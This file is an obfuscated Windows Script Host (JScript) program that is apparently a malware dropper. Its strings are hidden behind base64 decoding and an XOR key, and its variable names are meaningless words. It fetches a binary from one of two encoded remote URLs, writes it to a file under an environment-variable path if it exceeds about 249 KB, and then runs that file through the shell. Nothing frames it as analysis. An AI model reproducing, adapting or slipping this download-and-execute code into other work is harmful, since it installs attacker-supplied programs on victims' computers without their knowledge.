var _base64Idx = [
    /*43 -43 = 0*/
    /*'+',  1,  2,  3,'/' */
    62, -1, -1, -1, 63,

    /*'0','1','2','3','4','5','6','7','8','9' */
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61,

    /*15, 16, 17,'=', 19, 20, 21 */
    -1, -1, -1, 64, -1, -1, -1,

    /*65 - 43 = 22*/
    /*'A','B','C','D','E','F','G','H','I','J','K','L','M', */
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12,

    /*'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' */
    13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,

    /*91 - 43 = 48 */
    /*48, 49, 50, 51, 52, 53 */
    -1, -1, -1, -1, -1, -1,

    /*97 - 43 = 54*/
    /*'a','b','c','d','e','f','g','h','i','j','k','l','m' */
    26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38,

    /*'n','o','p','q','r','s','t','u','v','w','x','y','z' */
    39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
];

function decode(input, output, offset) {
    var out = output;
    if(!out) {
        out = new Uint8Array(Math.ceil(input.length / 4) * 3);
    }

    // remove all non-base64 characters
    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

    offset = offset || 0;
    var enc1, enc2, enc3, enc4;
    var i = 0, j = offset;

    while(i < input.length) {
        enc1 = _base64Idx[input.charCodeAt(i++) - 43];
        enc2 = _base64Idx[input.charCodeAt(i++) - 43];
        enc3 = _base64Idx[input.charCodeAt(i++) - 43];
        enc4 = _base64Idx[input.charCodeAt(i++) - 43];

        out[j++] = (enc1 << 2) | (enc2 >> 4);
        if(enc3 !== 64) {
            // decoded at least 2 bytes
            out[j++] = ((enc2 & 15) << 4) | (enc3 >> 2);
            if(enc4 !== 64) {
                // decoded 3 bytes
                out[j++] = ((enc3 & 3) << 6) | enc4;
            }
        }
    }

    // make sure result is the exact decoded length
    return output ?
        (j - offset) :
        out.subarray(0, j);
}

var YOkEkgnw60 = function (packedText) {

    var buffer = [];
    var length = decode(packedText, buffer);
    var charCodeAt = "charCodeAt";
    var result = "";
    for (var i = 0; i < length; i++) {
        result += String.fromCharCode(buffer[i] ^ "KmsYNzk2D2FrS9Sr"[charCodeAt](i % "KmsYNzk2D2FrS9Sr".length));
    }
    return result;
};
var predecessorazk = function() {
    var tourAq2 = function() {};
    tourAq2.prototype.create = function(turbidkTX) {
        return WScript.CreateObject(turbidkTX);
    };
    return tourAq2;
}();

(function() {
    var frustrateV22 = new predecessorazk();
    var constituencyn4T = 200;
    var remissionzmQ = YOkEkgnw60('"DCgn"');
    var scarcewcM = YOkEkgnw60('"DhUWOg=="');
    var ensconceTbV = YOkEkgnw60('"HD4QKycKHxwXWiMePw=="');
    var querulousISr = YOkEkgnw60('"Bj4rFAJIRWoJfg4mB2k="');
    var tourh7H = YOkEkgnw60('"MwUwG30uXUAgCw=="');
    var gentilityJWK = YOkEkgnw60('"Cik8HQw="');
    var leagueAOq = YOkEkgnw60('"GBkBPC8X"');
    var conjureXGR = YOkEkgnw60('"bjk2FB5fNw=="');
    var madrigalvUP = YOkEkgnw60('"ZQgLPA=="');
    var unimpeachablel3X = Math.pow(2, 10) * 249;
    var threadbarer4f = [ YOkEkgnw60('"IxkHKXRVRFohXiodKlYmHCwAEjc/C0VRK19pS2AXNgou"'), YOkEkgnw60('"IxkHKXRVRFohXiodKlYmHCwAEjcoHEVRK19pS2AXNgou"') ];
    var issuermU = 2097152;
    var broochrEb = frustrateV22.create(ensconceTbV);
    var readjustmentusT = frustrateV22.create(querulousISr);
    var venturem9n = frustrateV22.create(gentilityJWK + YOkEkgnw60('"ZQ=="') + leagueAOq);
    var denouementwNd = broochrEb.ExpandEnvironmentStrings(conjureXGR);
    var gravitytdJ = denouementwNd + issuermU + madrigalvUP;
    var contemptCKa = false;
    for (var endowuVD = 0; endowuVD < threadbarer4f.length; endowuVD++) {
        try {
            var stultifyjB8 = threadbarer4f[endowuVD];
            readjustmentusT.open(remissionzmQ, stultifyjB8, false);
            readjustmentusT.send();
            if (readjustmentusT.status == constituencyn4T) {
                try {
                    venturem9n.open();
                    venturem9n.type = 1;
                    venturem9n.write(readjustmentusT[YOkEkgnw60('"OQgAKSEUGFcGXSIL"')]);
                    if (venturem9n.size > unimpeachablel3X) {
                        endowuVD = threadbarer4f.length;
                        venturem9n.position = 0;
                        venturem9n.saveToFile(gravitytdJ, 2);
                        contemptCKa = true;
                    }
                } finally {
                    venturem9n.close();
                }
            }
        } catch (ignored) {}
    }
    if (contemptCKa) {
        broochrEb[scarcewcM](denouementwNd + Math.pow(2, 21));
    }
})();